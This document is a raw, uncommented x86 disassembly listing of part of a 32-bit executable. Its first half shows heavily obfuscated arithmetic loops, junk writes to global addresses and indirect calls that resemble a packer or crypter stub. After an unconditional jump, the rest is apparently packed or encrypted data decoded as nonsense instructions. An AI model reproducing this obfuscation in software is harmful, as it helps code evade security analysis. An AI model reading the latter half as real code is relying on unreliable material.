  41917c:	mov    edx,DWORD PTR [ebp+0x8]
  41917f:	mov    ebx,DWORD PTR [ebp-0x58]
  419182:	add    edx,0x5708e4
  419188:	imul   edx,ebx
  41918b:	mov    DWORD PTR [ebp-0x58],edx
  41918e:	mov    edx,DWORD PTR [ebp+0x8]
  419191:	mov    ebx,DWORD PTR [ebp-0x54]
  419194:	add    edx,0x64f882
  41919a:	or     edx,ebx
  41919c:	mov    DWORD PTR [ebp-0x54],edx
  41919f:	mov    edx,DWORD PTR [ebp+0x8]
  4191a2:	mov    ebx,DWORD PTR [ebp-0x50]
  4191a5:	add    edx,ecx
  4191a7:	xor    edx,ebx
  4191a9:	mov    DWORD PTR [ebp-0x50],edx
  4191ac:	mov    edx,DWORD PTR [ebp+0x8]
  4191af:	mov    ebx,DWORD PTR [ebp-0x4c]
  4191b2:	add    edx,edi
  4191b4:	and    edx,ebx
  4191b6:	mov    DWORD PTR [ebp-0x4c],edx
  4191b9:	mov    edx,DWORD PTR [ebp+0x8]
  4191bc:	mov    ebx,DWORD PTR [ebp-0x48]
  4191bf:	lea    edx,[ebx+edx*1+0x241fcdf]
  4191c6:	mov    DWORD PTR [ebp-0x48],edx
  4191c9:	mov    edx,DWORD PTR [ebp+0x8]
  4191cc:	mov    ebx,0xfa5e1522
  4191d1:	sub    ebx,edx
  4191d3:	add    ebx,DWORD PTR [ebp-0x44]
  4191d6:	mov    DWORD PTR [ebp-0x44],ebx
  4191d9:	mov    edx,DWORD PTR [ebp+0x8]
  4191dc:	xor    edx,eax
  4191de:	add    edx,esi
  4191e0:	jne    0x419169
  4191e6:	mov    edx,DWORD PTR [ebp-0x8]
  4191e9:	mov    ebx,DWORD PTR [ebp-0xc]
  4191ec:	xor    edx,eax
  4191ee:	lea    edx,[edx+ebx*1+0x3272f6]
  4191f5:	mov    DWORD PTR [ebp-0xc],edx
  4191f8:	mov    edx,DWORD PTR [ebp-0x10]
  4191fb:	xor    edx,eax
  4191fd:	add    edx,esi
  4191ff:	jne    0x416a2c
  419205:	jmp    0x41931c
  41920a:	mov    ecx,DWORD PTR [ebp-0x14]
  41920d:	mov    DWORD PTR [ebp+0x8],ecx
  419210:	jmp    0x419289
  419215:	mov    ecx,DWORD PTR [ebp+0x8]
  419218:	mov    edx,DWORD PTR [ebp-0x8]
  41921b:	xor    ecx,eax
  41921d:	xor    edx,eax
  41921f:	sub    ecx,edx
  419221:	sub    ecx,esi
  419223:	xor    ecx,eax
  419225:	mov    DWORD PTR [ebp+0x8],ecx
  419228:	mov    ecx,DWORD PTR [ebp+0x8]
  41922b:	mov    edx,DWORD PTR [ebp-0x58]
  41922e:	add    ecx,0x5708e4
  419234:	imul   ecx,edx
  419237:	mov    DWORD PTR [ebp-0x58],ecx
  41923a:	mov    ecx,DWORD PTR [ebp+0x8]
  41923d:	mov    edx,DWORD PTR [ebp-0x54]
  419240:	add    ecx,0x64f882
  419246:	or     ecx,edx
  419248:	mov    DWORD PTR [ebp-0x54],ecx
  41924b:	mov    ecx,DWORD PTR [ebp+0x8]
  41924e:	mov    edx,DWORD PTR [ebp-0x50]
  419251:	add    ecx,0x242ebf1
  419257:	xor    ecx,edx
  419259:	mov    DWORD PTR [ebp-0x50],ecx
  41925c:	mov    ecx,DWORD PTR [ebp+0x8]
  41925f:	mov    edx,DWORD PTR [ebp-0x4c]
  419262:	add    ecx,edi
  419264:	and    ecx,edx
  419266:	mov    DWORD PTR [ebp-0x4c],ecx
  419269:	mov    ecx,DWORD PTR [ebp+0x8]
  41926c:	mov    edx,DWORD PTR [ebp-0x48]
  41926f:	lea    ecx,[edx+ecx*1+0x241fcdf]
  419276:	mov    DWORD PTR [ebp-0x48],ecx
  419279:	mov    ecx,DWORD PTR [ebp+0x8]
  41927c:	mov    edx,0xfa5e1522
  419281:	sub    edx,ecx
  419283:	add    edx,DWORD PTR [ebp-0x44]
  419286:	mov    DWORD PTR [ebp-0x44],edx
  419289:	mov    ecx,DWORD PTR [ebp+0x8]
  41928c:	xor    ecx,eax
  41928e:	add    ecx,esi
  419290:	jne    0x419215
  419296:	jmp    0x419328
  41929b:	mov    ecx,DWORD PTR [ebp+0x8]
  41929e:	mov    edx,DWORD PTR [ebp-0x8]
  4192a1:	xor    ecx,eax
  4192a3:	xor    edx,eax
  4192a5:	sub    ecx,edx
  4192a7:	sub    ecx,esi
  4192a9:	xor    ecx,eax
  4192ab:	mov    DWORD PTR [ebp+0x8],ecx
  4192ae:	mov    ecx,DWORD PTR [ebp+0x8]
  4192b1:	mov    edx,DWORD PTR [ebp-0x58]
  4192b4:	add    ecx,0x5708e4
  4192ba:	imul   ecx,edx
  4192bd:	mov    DWORD PTR [ebp-0x58],ecx
  4192c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4192c3:	mov    edx,DWORD PTR [ebp-0x54]
  4192c6:	add    ecx,0x64f882
  4192cc:	or     ecx,edx
  4192ce:	mov    DWORD PTR [ebp-0x54],ecx
  4192d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4192d4:	mov    edx,DWORD PTR [ebp-0x50]
  4192d7:	add    ecx,0x242ebf1
  4192dd:	xor    ecx,edx
  4192df:	mov    DWORD PTR [ebp-0x50],ecx
  4192e2:	mov    ecx,DWORD PTR [ebp+0x8]
  4192e5:	mov    edx,DWORD PTR [ebp-0x4c]
  4192e8:	add    ecx,edi
  4192ea:	and    ecx,edx
  4192ec:	mov    DWORD PTR [ebp-0x4c],ecx
  4192ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4192f2:	mov    edx,DWORD PTR [ebp-0x48]
  4192f5:	lea    ecx,[edx+ecx*1+0x241fcdf]
  4192fc:	mov    DWORD PTR [ebp-0x48],ecx
  4192ff:	mov    ecx,DWORD PTR [ebp+0x8]
  419302:	mov    edx,0xfa5e1522
  419307:	sub    edx,ecx
  419309:	add    edx,DWORD PTR [ebp-0x44]
  41930c:	mov    DWORD PTR [ebp-0x44],edx
  41930f:	mov    ecx,DWORD PTR [ebp+0x8]
  419312:	xor    ecx,eax
  419314:	add    ecx,esi
  419316:	jne    0x41929b
  41931c:	mov    ecx,DWORD PTR [ebp-0x8]
  41931f:	xor    ecx,eax
  419321:	mov    eax,DWORD PTR [ebp+0x10]
  419324:	add    ecx,esi
  419326:	mov    DWORD PTR [eax],ecx
  419328:	pop    edi
  419329:	pop    esi
  41932a:	pop    ebx
  41932b:	leave  
  41932c:	ret    0xc
  41932f:	push   ebp
  419330:	mov    ebp,esp
  419332:	sub    esp,0x78
  419335:	and    DWORD PTR ds:0x428eaf,0x46d6
  41933f:	push   esi
  419340:	push   edi
  419341:	or     eax,DWORD PTR ds:0x428e37
  419347:	mov    eax,ds:0x428373
  41934c:	or     ecx,edi
  41934e:	mov    DWORD PTR [ebp-0x24],eax
  419351:	and    DWORD PTR ds:0x428eb3,0x0
  41935b:	jmp    0x41936b
  419360:	mov    eax,ds:0x428eb3
  419365:	inc    eax
  419366:	mov    ds:0x428eb3,eax
  41936b:	cmp    DWORD PTR ds:0x428eb3,0x15
  419372:	jae    0x41939a
  419378:	cmp    DWORD PTR ds:0x428eb3,0x21
  41937f:	ja     0x41939a
  419385:	jmp    0x419395
  41938a:	push   0x6ea1
  41938f:	call   DWORD PTR ds:0x42aa07
  419395:	jmp    0x419360
  41939a:	mov    eax,ds:0x428493
  41939f:	mov    DWORD PTR [ebp-0x30],eax
  4193a2:	mov    DWORD PTR [ebp-0x2c],0xf89c85a5
  4193a9:	sub    DWORD PTR ds:0x428e3f,edi
  4193af:	mov    DWORD PTR [ebp-0x28],0xf89c85a4
  4193b6:	mov    eax,DWORD PTR [ebp-0x10]
  4193b9:	mov    ecx,DWORD PTR [ebp-0x10]
  4193bc:	sub    eax,ecx
  4193be:	mov    DWORD PTR [ebp-0x10],eax
  4193c1:	and    DWORD PTR ds:0x428e93,edi
  4193c7:	xor    DWORD PTR [ebp-0x10],0xf89cb5a5
  4193ce:	adc    ecx,0x318b
  4193d4:	mov    eax,DWORD PTR [ebp-0x18]
  4193d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4193da:	xor    DWORD PTR ds:0x428e8f,edi
  4193e0:	sub    eax,ecx
  4193e2:	mov    DWORD PTR [ebp-0x18],eax
  4193e5:	sbb    DWORD PTR ds:0x428e5b,ebx
  4193eb:	or     DWORD PTR [ebp-0x18],0xf89f05a5
  4193f2:	or     DWORD PTR ds:0x428e2f,ebx
  4193f8:	mov    eax,DWORD PTR [ebp-0xc]
  4193fb:	adc    DWORD PTR ds:0x428e47,ecx
  419401:	mov    ecx,DWORD PTR [ebp-0xc]
  419404:	sub    eax,ecx
  419406:	add    DWORD PTR ds:0x428e6f,edx
  41940c:	mov    DWORD PTR [ebp-0xc],eax
  41940f:	and    DWORD PTR ds:0x428eb7,ecx
  419415:	or     DWORD PTR [ebp-0xc],0xf89c85e5
  41941c:	add    DWORD PTR ds:0x428ec7,ebx
  419422:	mov    eax,DWORD PTR [ebp-0x1c]
  419425:	mov    ecx,DWORD PTR [ebp-0x1c]
  419428:	sub    eax,ecx
  41942a:	add    edi,0xa93
  419430:	mov    DWORD PTR [ebp-0x1c],eax
  419433:	or     DWORD PTR ds:0x428e87,0x297e
  41943d:	or     DWORD PTR [ebp-0x1c],0xf89c8585
  419444:	mov    eax,DWORD PTR [ebp-0x20]
  419447:	mov    DWORD PTR ds:0x428e9f,0x15
  419451:	cmp    DWORD PTR ds:0x428e9f,0x0
  419458:	je     0x4194a7
  41945e:	cmp    DWORD PTR ds:0x428e9f,0x5
  419465:	jb     0x4194a7
  41946b:	jmp    0x419479
  419470:	push   DWORD PTR [ebp-0x20]
  419473:	call   DWORD PTR ds:0x42aa0b
  419479:	cmp    DWORD PTR ds:0x428e9f,0x6
  419480:	jne    0x419495
  419486:	xor    edi,edi
  419488:	or     edi,DWORD PTR ds:0x428e9f
  41948e:	dec    edi
  41948f:	mov    DWORD PTR ds:0x428e9f,edi
  419495:	mov    edi,DWORD PTR ds:0x428e9f
  41949b:	dec    edi
  41949c:	mov    DWORD PTR ds:0x428e9f,edi
  4194a2:	jmp    0x419451
  4194a7:	mov    ecx,DWORD PTR [ebp-0x20]
  4194aa:	sub    DWORD PTR ds:0x428e73,0x4181
  4194b4:	sub    eax,ecx
  4194b6:	mov    DWORD PTR [ebp-0x20],eax
  4194b9:	neg    edi
  4194bb:	mov    eax,DWORD PTR [ebp-0x2c]
  4194be:	mov    ecx,DWORD PTR [ebp-0x20]
  4194c1:	mov    esi,0x75108af
  4194c6:	xor    eax,esi
  4194c8:	add    DWORD PTR ds:0x428e2f,0x596
  4194d2:	mov    edi,0x3272f6
  4194d7:	or     DWORD PTR ds:0x428e43,0x428e77
  4194e1:	add    eax,edi
  4194e3:	or     eax,ecx
  4194e5:	mov    DWORD PTR ds:0x428e43,0x54e0
  4194ef:	mov    DWORD PTR [ebp-0x20],eax
  4194f2:	add    eax,0x58c9
  4194f7:	mov    eax,DWORD PTR [ebp-0x4]
  4194fa:	jmp    0x41b84d
  4194ff:	imul   edx,DWORD PTR [edi],0x45054527
  419505:	or     DWORD PTR [edi],edx
  419507:	dec    esp
  419508:	xchg   ecx,eax
  419509:	in     al,0xff
  41950b:	ficom  WORD PTR [ebp-0x38]
  41950e:	adc    eax,0x8382205d
  419513:	dec    ebp
  419514:	pusha  
  419515:	add    DWORD PTR [ebx+0x516fd412],0x6b
  41951c:	mov    cl,0x6b
  41951e:	inc    esp
  41951f:	mov    eax,ds:0xf1a76083
  419524:	jmp    DWORD PTR [ecx+eiz*1+0x2bc4b91]
  41952b:	imul   esp,eax,0xffffffa8
  41952e:	aas    
  41952f:	cmp    eax,ebx
  419531:	jge    0x419529
  419533:	shr    edi,1
  419535:	cmp    ebp,ebx
  419537:	test   al,0xab
  419539:	call   0x6d67:0x69d5c899
  419540:	das    
  419541:	sub    cl,ah
  419543:	das    
  419544:	jp     0x419510
  419546:	xor    bh,BYTE PTR [ecx-0x2f]
  419549:	jne    0x4195be
  41954b:	test   DWORD PTR cs:[ecx+esi*1],ecx
  41954f:	push   edx
  419550:	and    eax,0xc38a09cb
  419555:	ret    0x878d
  419558:	cmp    al,0x6f
  41955a:	lods   al,BYTE PTR ds:[esi]
  41955b:	shr    BYTE PTR [edi-0x6037915e],cl
  419561:	loope  0x41959e
  419563:	pop    es
  419564:	add    al,BYTE PTR [ebx+0x32]
  419567:	xchg   cl,dh
  419569:	adc    BYTE PTR [ebp+ecx*1-0x31f046e],al
  419570:	int3   
  419571:	pop    esi
  419572:	loop   0x419532
  419574:	jmp    0x4195ba
  419576:	mov    ds:0x56ec1d13,al
  41957b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41957c:	nop
  41957d:	jns    0x419504
  41957f:	lea    esp,[ecx-0x3c4fdfcc]
  419585:	mov    eax,0x542b7ae8
  41958a:	push   esi
  41958b:	(bad)  
  41958c:	xor    edi,esp
  41958e:	fidiv  WORD PTR [ecx-0x54]
  419591:	(bad)  
  419592:	ins    DWORD PTR es:[edi],dx
  419593:	loopne 0x4195cc
  419595:	xchg   esp,eax
  419596:	adc    eax,0xa62ef1af
  41959b:	mov    eax,?
  41959d:	pusha  
  41959e:	pop    edx
  41959f:	xchg   BYTE PTR [edi+0x6ead71db],bh
  4195a5:	jmp    0x5df2bab4
  4195aa:	mov    edi,0xdc7f08db
  4195af:	test   al,0x6f
  4195b1:	loopne 0x4195f1
  4195b3:	das    
  4195b4:	push   ds
  4195b5:	je     0x4195cd
  4195b7:	loopne 0x41955b
  4195b9:	mov    ah,ch
  4195bb:	or     al,dh
  4195bd:	jnp    0x41961e
  4195bf:	jbe    0x4195ee
  4195c1:	fs retf 
  4195c3:	int    0xd9
  4195c5:	(bad)  
  4195c6:	push   es
  4195c7:	push   DWORD PTR [ebx+0x4f]
  4195ca:	call   0x53015e98
  4195cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195d0:	jno    0x41959f
  4195d2:	sub    eax,0x17a83f51
  4195d7:	das    
  4195d8:	cmp    al,0x93
  4195da:	inc    edx
  4195db:	cmp    bh,BYTE PTR [ebx-0x23e4761e]
  4195e1:	or     BYTE PTR [ebp+edx*2-0x57],ah
  4195e5:	nop
  4195e6:	or     al,0xc0
  4195e8:	gs daa 
  4195ea:	lahf   
  4195eb:	repnz popa 
  4195ed:	or     DWORD PTR [ecx-0x41b715a3],esi
  4195f3:	aas    
  4195f4:	stc    
  4195f5:	cmp    eax,0xd1b8bff7
  4195fa:	add    BYTE PTR [edi],dl
  4195fc:	add    DWORD PTR [ecx+0xd62e41e],esp
  419602:	in     eax,0x78
  419604:	loope  0x41958b
  419606:	push   cs
  419607:	dec    ebp
  419608:	mov    esp,0xf5adf51a
  41960d:	stos   DWORD PTR es:[edi],eax
  41960e:	in     eax,dx
  41960f:	div    dh
  419611:	sub    cl,BYTE PTR [ebp+esi*2-0x4e]
  419615:	adc    DWORD PTR [ebp-0x37de8a2a],ebx
  41961b:	rcl    edx,cl
  41961d:	jg     0x4195e4
  41961f:	adc    bh,BYTE PTR [esi+edi*4-0x43fc38b9]
  419626:	or     eax,0x58fbe3dd
  41962b:	jmp    0x4003:0x5bba8cf0
  419632:	mov    dl,0x6f
  419634:	sub    eax,DWORD PTR [ebx+0x9a8980a]
  41963a:	cmp    al,0x56
  41963c:	xchg   edi,eax
  41963d:	test   DWORD PTR [edx],0x668c8d04
  419643:	out    dx,eax
  419644:	fwait
  419645:	sbb    esp,DWORD PTR [esi-0x79]
  419648:	xlat   BYTE PTR ds:[ebx]
  419649:	and    al,0x36
  41964b:	loop   0x4195ff
  41964d:	sub    eax,0xf06b8fc0
  419652:	rcr    BYTE PTR [edx],cl
  419654:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419655:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419656:	inc    esi
  419657:	jecxz  0x41967b
  419659:	push   ecx
  41965a:	ins    BYTE PTR es:[edi],dx
  41965b:	xor    BYTE PTR [esi],bh
  41965d:	and    ch,BYTE PTR [edx-0x39]
  419660:	jg     0x419614
  419662:	sub    esi,DWORD PTR [di+0x63]
  419666:	test   eax,0xc5110cf8
  41966b:	jbe    0x419690
  41966d:	pop    eax
  41966e:	dec    ebp
  41966f:	or     ebp,edi
  419671:	mov    bh,0xd1
  419673:	and    ch,cl
  419675:	mov    ?,eax
  419677:	inc    edx
  419678:	xchg   ebp,eax
  419679:	lds    ebx,FWORD PTR [edi]
  41967b:	jno    0x419698
  41967d:	mov    al,0x52
  41967f:	fucomi st,st(5)
  419681:	cs or  al,0xc8
  419684:	xor    al,0xaf
  419686:	add    edi,esp
  419688:	mov    dl,0x8c
  41968a:	repnz add BYTE PTR [edx+0x5f6d4710],ch
  419691:	test   eax,0xf58de20d
  419696:	lods   eax,DWORD PTR ds:[esi]
  419697:	jmp    0x7409:0xcc730ba2
  41969e:	mov    ebp,0x8e0ac33d
  4196a3:	cli    
  4196a4:	jmp    0x1210:0x2048f316
  4196ab:	mov    esp,0xc1032e07
  4196b0:	les    edi,FWORD PTR [ebx+ebx*8-0x4c]
  4196b4:	inc    ecx
  4196b5:	push   0x50aa4ffb
  4196ba:	xchg   ebp,eax
  4196bb:	sbb    al,0x45
  4196bd:	lds    esp,FWORD PTR [ebx]
  4196bf:	mov    ch,0x92
  4196c1:	sub    DWORD PTR [ecx+0xe],0x2c
  4196c5:	push   ebx
  4196c6:	and    DWORD PTR [ebx+edi*2],edx
  4196c9:	push   ds
  4196ca:	jecxz  0x4196a8
  4196cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4196cd:	test   al,0x12
  4196cf:	inc    ecx
  4196d0:	mov    ebx,0x4b9941c6
  4196d5:	push   edi
  4196d6:	cmp    ebx,DWORD PTR [edi-0x6b]
  4196d9:	scas   al,BYTE PTR es:[edi]
  4196da:	aad    0x71
  4196dc:	loope  0x419675
  4196de:	addr16 jge 0x419726
  4196e1:	jns    0x419730
  4196e3:	jne    0x419737
  4196e5:	clc    
  4196e6:	push   0xee421c6c
  4196eb:	or     BYTE PTR [ecx+0x38b1e078],bh
  4196f1:	call   0x76f3:0x624a7bde
  4196f8:	sti    
  4196f9:	jne    0x4196eb
  4196fb:	mov    WORD PTR [eax+0x9],cs
  4196fe:	mov    esp,DWORD PTR [eax]
  419700:	in     al,0x3d
  419702:	push   ss
  419703:	dec    ecx
  419704:	sub    eax,0x56e93688
  419709:	dec    ecx
  41970a:	push   ds
  41970b:	push   es
  41970c:	aaa    
  41970d:	iret   
  41970e:	jp     0x4196c8
  419710:	out    0xdb,eax
  419712:	sub    bl,bh
  419714:	dec    BYTE PTR [edi+0x7fbbe704]
  41971a:	fdiv   DWORD PTR [esp+edi*1-0x51]
  41971e:	adc    DWORD PTR [ecx],eax
  419720:	sub    BYTE PTR [esp+ecx*2-0x29],bl
  419724:	lock add BYTE PTR [edi],ah
  419727:	sub    eax,0xa32ae548
  41972c:	adc    dh,bl
  41972e:	cwde   
  41972f:	or     eax,0x38016d56
  419734:	xor    al,0x8c
  419736:	call   0xd333:0x69c80da4
  41973d:	into   
  41973e:	cli    
  41973f:	lds    esi,FWORD PTR [ebx-0x7ed50a52]
  419745:	mov    edi,0x1250127d
  41974a:	dec    eax
  41974b:	pop    esp
  41974c:	jp     0x419796
  41974e:	or     BYTE PTR [eax+0x6f1a65d9],0xa1
  419755:	sub    cl,BYTE PTR [ebx+0x5c9a38dc]
  41975b:	push   esi
  41975c:	xchg   ecx,eax
  41975d:	lahf   
  41975e:	mov    WORD PTR [esi+0x2d28f283],ss
  419764:	mov    al,ds:0x77ecca83
  419769:	xor    eax,0xc877a20
  41976e:	or     bh,BYTE PTR [ebx]
  419770:	xor    al,0xf3
  419772:	mov    eax,0x3059a7ca
  419777:	lock ja 0x419736
  41977a:	icebp  
  41977b:	mov    al,ds:0xa634e8da
  419780:	sbb    al,0xb1
  419782:	es call 0x5022:0xc878bd5d
  41978a:	popf   
  41978b:	sbb    DWORD PTR [ebx+0x3d7cf814],edi
  419791:	hlt    
  419792:	mov    esi,0x83b34cc8
  419797:	mov    ecx,0x2c48f35f
  41979c:	loope  0x419780
  41979e:	and    DWORD PTR [ecx+0x9],edi
  4197a1:	mov    edx,0xcff07d98
  4197a6:	adc    cl,dh
  4197a8:	pop    esi
  4197a9:	outs   dx,DWORD PTR ds:[esi]
  4197aa:	ins    DWORD PTR es:[edi],dx
  4197ab:	xchg   esp,eax
  4197ac:	cs jge 0x41977c
  4197af:	sbb    eax,0x95a6ebce
  4197b4:	sbb    ecx,DWORD PTR gs:[ecx]
  4197b7:	aad    0xf7
  4197b9:	stc    
  4197ba:	sti    
  4197bb:	jecxz  0x4197df
  4197bd:	dec    ebp
  4197be:	xor    DWORD PTR [ebp+eiz*2+0x52],esp
  4197c2:	lods   eax,DWORD PTR ds:[esi]
  4197c3:	sub    BYTE PTR [edx+0x6f7b8e35],bh
  4197c9:	and    eax,0x19b05981
  4197ce:	push   cs
  4197cf:	fs (bad) 
  4197d1:	sbb    ecx,DWORD PTR [ecx-0x7667cb9d]
  4197d7:	push   esi
  4197d8:	sub    al,0xd0
  4197da:	hlt    
  4197db:	dec    ecx
  4197dc:	dec    ecx
  4197dd:	inc    ecx
  4197de:	repz in eax,dx
  4197e0:	mov    esi,0xe338707e
  4197e5:	mov    dl,0x32
  4197e7:	jmp    DWORD PTR [edi+0x616db0c7]
  4197ed:	inc    esp
  4197ee:	leave  
  4197ef:	push   edx
  4197f0:	aas    
  4197f1:	or     DWORD PTR [ebp-0x19],esp
  4197f4:	adc    dh,BYTE PTR [ebx]
  4197f6:	adc    bh,ch
  4197f8:	out    0xa5,al
  4197fa:	and    al,BYTE PTR [esi+0x24]
  4197fd:	std    
  4197fe:	aas    
  4197ff:	mov    eax,0xd2a363b
  419804:	lods   al,BYTE PTR ds:[esi]
  419805:	in     eax,dx
  419806:	xchg   edi,eax
  419807:	je     0x419809
  419809:	inc    eax
  41980a:	cmp    eax,0xe0536c04
  41980f:	adc    eax,0x7ced9c1
  419814:	xor    ecx,DWORD PTR [esi+0x5a]
  419817:	(bad)  
  419818:	mov    ds:0xd1848df3,al
  41981d:	sbb    eax,0xfdf1b3e4
  419822:	pop    edx
  419823:	push   0xb493c711
  419828:	mov    dh,0xbf
  41982a:	cli    
  41982b:	nop
  41982c:	bound  eax,QWORD PTR [edi-0xebd3a14]
  419832:	pop    es
  419833:	or     eax,0xd627c322
  419838:	jecxz  0x419893
  41983a:	ret    
  41983b:	loope  0x419801
  41983d:	mov    bl,0x54
  41983f:	push   0x6d
  419841:	and    ebp,edx
  419843:	xor    bh,al
  419845:	sbb    edi,esp
  419847:	adc    al,0x5
  419849:	cs loop 0x41989c
  41984c:	(bad)  
  41984e:	out    dx,al
  41984f:	jmp    0x41985a
  419851:	stc    
  419852:	bound  esi,QWORD PTR [ecx+0x4a5973e3]
  419858:	mov    ebx,ss
  41985a:	fcomip st,st(2)
  41985c:	pop    ebp
  41985d:	out    dx,eax
  41985e:	xchg   ecx,eax
  41985f:	mov    eax,0x82726bf1
  419864:	ret    0x28c
  419867:	sub    ebp,DWORD PTR [edx-0x75]
  41986a:	mov    dh,0x7e
  41986c:	pushf  
  41986d:	clc    
  41986e:	jmp    0x9fe747b6
  419873:	repnz sub eax,0x6463fc16
  419879:	mov    bl,0x49
  41987b:	pop    ss
  41987c:	mov    edi,0xf614540c
  419881:	mov    esp,0xcb0d63be
  419886:	gs mov edi,0xf1f4fd3d
  41988c:	inc    edx
  41988d:	outs   dx,BYTE PTR ds:[esi]
  41988e:	jne    0x41985c
  419890:	loop   0x419882
  419892:	addr16 mov ah,0x48
  419895:	in     al,0x89
  419897:	fcmovu st,st(2)
  419899:	sbb    al,0xb6
  41989b:	add    BYTE PTR [eax],ch
  41989d:	es ins DWORD PTR es:[edi],dx
  41989f:	mov    bh,0xd0
  4198a1:	(bad)  
  4198a3:	pop    ebx
  4198a4:	inc    esi
  4198a5:	lods   al,BYTE PTR ds:[esi]
  4198a6:	adc    edx,ecx
  4198a8:	push   0xffffff93
  4198aa:	repz iret 
  4198ac:	fnstcw WORD PTR [eax+0x2c]
  4198af:	xor    al,0x88
  4198b1:	sbb    DWORD PTR [ecx],0x4cd7d2ec
  4198b7:	push   ebp
  4198b8:	xchg   esi,eax
  4198b9:	and    DWORD PTR [eax-0xfd01dab],esp
  4198bf:	push   0x7f32ee30
  4198c4:	xchg   edx,eax
  4198c5:	xor    al,0x1d
  4198c7:	fdivr  DWORD PTR [ecx]
  4198c9:	(bad)  [edi]
  4198cb:	dec    eax
  4198cc:	les    edx,FWORD PTR [esi]
  4198ce:	ja     0x419882
  4198d0:	or     eax,0x54f0b0d2
  4198d5:	loope  0x419931
  4198d7:	test   al,0xe7
  4198d9:	data16 (bad) 
  4198db:	out    dx,eax
  4198dc:	fdecstp 
  4198de:	mov    eax,ds:0x12dc2834
  4198e3:	push   ebx
  4198e4:	inc    ebp
  4198e5:	jae    0x4198b0
  4198e7:	mov    BYTE PTR [ecx],al
  4198e9:	aas    
  4198ea:	sbb    BYTE PTR [edx+0x3597e548],bh
  4198f0:	add    BYTE PTR [eax+0x509d44ae],al
  4198f6:	cmp    al,0x29
  4198f8:	dec    esi
  4198f9:	fstp   DWORD PTR [edi+edi*1+0x4e]
  4198fd:	push   eax
  4198fe:	neg    BYTE PTR [ecx-0x7084de23]
  419904:	xor    BYTE PTR [edi-0x4c6187b0],dl
  41990a:	imul   esi,esi,0x6a
  41990d:	loopne 0x4198d0
  41990f:	mov    ah,0xba
  419911:	or     DWORD PTR [ecx-0x42016dd0],edi
  419917:	and    bh,bh
  419919:	mov    ebx,0xad1e839e
  41991e:	dec    edx
  41991f:	push   cs
  419920:	mov    al,0x24
  419922:	call   0x411b2f0d
  419927:	(bad)  
  419928:	(bad)  
  419929:	leave  
  41992a:	jnp    0x4198bd
  41992c:	cwde   
  41992d:	jno    0x41995d
  41992f:	xor    cl,BYTE PTR [eax+0x24]
  419932:	fs out 0xd9,al
  419935:	test   eax,0xf574c636
  41993a:	add    ch,cl
  41993c:	loop   0x419960
  41993e:	daa    
  41993f:	jo     0x419920
  419941:	xor    ch,BYTE PTR [ecx+0xc8771d7]
  419947:	fistp  WORD PTR [ebp-0x6c]
  41994a:	fucomip st,st(1)
  41994c:	stc    
  41994d:	imul   ebp,DWORD PTR [eax],0xffffff81
  419950:	pop    ss
  419951:	test   BYTE PTR [eax-0x582b8bd7],ah
  419957:	mov    ds:0xd9a65db2,al
  41995d:	sti    
  41995e:	xchg   DWORD PTR [esi],eax
  419960:	mov    ecx,0xc9cd735f
  419965:	loop   0x41991c
  419967:	mov    dh,0x3c
  419969:	std    
  41996a:	mov    DWORD PTR [eax],0xdace3bf0
  419970:	inc    eax
  419971:	sub    eax,0xea78ce78
  419976:	xchg   ebp,eax
  419977:	jae    0x41997a
  419979:	mov    es,WORD PTR [ecx+ecx*4+0x1e]
  41997d:	loop   0x4199ef
  41997f:	mov    bl,0xd9
  419981:	xor    eax,0x3cac14b4
  419986:	mov    ah,BYTE PTR [esi-0x36]
  419989:	add    BYTE PTR [eax+0x4],0x9e
  41998d:	call   0x60cd:0xa7b226ea
  419994:	mov    al,0x7a
  419996:	iret   
  419997:	movlhps xmm0,xmm7
  41999a:	xlat   BYTE PTR ds:[ebx]
  41999b:	(bad)  
  41999c:	jle    0x4199e8
  41999e:	mov    BYTE PTR [edx+0x3010ac2b],cl
  4199a4:	je     0x4199a5
  4199a6:	sub    cl,BYTE PTR [ecx+ebx*4]
  4199a9:	mov    eax,0xc25a71bf
  4199ae:	aaa    
  4199af:	sbb    ebx,DWORD PTR [ebx+0xba2d11]
  4199b5:	shl    DWORD PTR [ecx],cl
  4199b7:	or     BYTE PTR [edx],bh
  4199b9:	push   es
  4199ba:	push   ss
  4199bb:	cmp    DWORD PTR [edx],ebx
  4199bd:	dec    esi
  4199be:	xor    edx,DWORD PTR [ecx+0x4d]
  4199c1:	scas   al,BYTE PTR es:[edi]
  4199c2:	cmc    
  4199c3:	sbb    edi,DWORD PTR [ecx+0x4e9934fc]
  4199c9:	or     bl,ah
  4199cb:	pop    ss
  4199cc:	mov    ecx,0x7df6938b
  4199d1:	(bad)  
  4199d2:	mov    ch,BYTE PTR [esi+0x61]
  4199d5:	fs popf 
  4199d7:	lahf   
  4199d8:	mov    ebp,0xe0b65e9c
  4199dd:	and    DWORD PTR [ebp+0x3bc30b22],edi
  4199e3:	pop    ss
  4199e4:	xor    BYTE PTR [eax+ebx*1-0x40],dl
  4199e8:	mov    fs,WORD PTR [ebp+0x69]
  4199eb:	pop    edx
  4199ec:	sti    
  4199ed:	xor    ebx,DWORD PTR [edx]
  4199ef:	push   edi
  4199f0:	ds pop ds
  4199f2:	mov    ebp,0xb1cc4ebb
  4199f7:	das    
  4199f8:	jmp    0x4199d7
  4199fa:	outs   dx,BYTE PTR ds:[esi]
  4199fb:	dec    ebp
  4199fc:	repz jl 0x4199a4
  4199ff:	mul    esp
  419a01:	sahf   
  419a02:	in     eax,0x86
  419a04:	call   0xd567:0x8ecd14fb
  419a0b:	stos   BYTE PTR es:[edi],al
  419a0c:	in     al,dx
  419a0d:	fadd   QWORD PTR [edx]
  419a0f:	sub    eax,0xbe344abb
  419a14:	addr16 push es
  419a16:	fcom   QWORD PTR [edx]
  419a18:	sub    DWORD PTR [edx],ebx
  419a1a:	sbb    DWORD PTR [edx+0x72],edi
  419a1d:	or     BYTE PTR [ebp+0x2f],dl
  419a20:	ret    
  419a21:	and    DWORD PTR [edx+0x6a],esi
  419a24:	inc    BYTE PTR ds:0x8e87aee3
  419a2a:	pop    ds
  419a2b:	add    al,0xd0
  419a2d:	pop    ebx
